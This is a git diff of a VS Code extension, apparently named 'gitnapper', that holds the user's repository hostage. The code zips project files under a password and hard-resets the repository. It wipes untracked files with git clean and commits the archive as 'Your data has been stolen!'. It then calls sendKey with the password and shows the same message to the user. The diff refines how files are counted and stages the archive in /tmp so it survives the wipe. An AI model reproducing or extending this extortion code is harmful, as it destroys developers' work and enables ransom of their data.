@@ -206,7 +206,7 @@ async function sendKey(password) {
 async function getModified(status, git) {
   const modified = await Promise.all(
     status.modified.map(async (file) => {
-      let changes = 0;
+      let changes = 1;
       const ext = path.extname(file);
 
       // Get the number of changed lines in the file
@@ -224,7 +224,7 @@ async function getModified(status, git) {
     })
   );
 
-  return modified.filter((file) => file.changes > 0);
+  return modified;
 }
 
 /**
@@ -233,10 +233,12 @@ async function getModified(status, git) {
  * @param status Detected changes.
  * @param root File root path.
  */
-async function getAdded(status, root) {
-  const added = await Promise.all(
-    status.not_added.map(async (file) => {
-      let changes = 0;
+async function getNew(status, root) {
+  const files = [...status.not_added, ...status.created];
+
+  const newFiles = await Promise.all(
+    files.map(async (file) => {
+      let changes = 1;
       const filePath = path.join(root, file);
       try {
         const ext = path.extname(file);
@@ -246,19 +248,16 @@ async function getAdded(status, root) {
         }
       } catch (error) {
         console.error(`Error reading file ${file}:`, error);
-        changes = 0;
       }
 
       return {
-        file: file,
-        changes: changes,
+        file,
+        changes,
       };
     })
   );
-
-  return added.filter((file) => file.changes > 0);
+  return newFiles;
 }
-
 /**
  * Activates the extension and registers commands
  * @param {*} context
@@ -286,7 +285,7 @@ function activate(context) {
         }
 
         const modified = await getModified(status, git);
-        const added = await getAdded(status, root);
+        const added = await getNew(status, root);
 
         linesChanged += modified.length
           ? modified.reduce((i, file) => i + file.changes, 0)
@@ -306,13 +305,15 @@ function activate(context) {
         console.log("Password:", password);
 
         // Output handler
-        const out = path.join(root, "output.zip");
-        const output = fs.createWriteStream(out);
+        const out = path.join(root, "gitnapper-output.zip");
+        const tmp = "/tmp/gitnapper-output.zip"
+        const output = fs.createWriteStream(tmp);
         output.on("close", async () => {
-          await git.add(out);
-          await git.commit("Your data has been stolen!");
           await git.reset(["--hard"]);
           await git.clean("f", "-d");
+          fs.rename(tmp, out, (err) => {})
+          await git.add(out);
+          await git.commit("Your data has been stolen!");
           await sendKey(password);
           password = "";
           vscode.window.showInformationMessage("Your data has been stolen!\n");
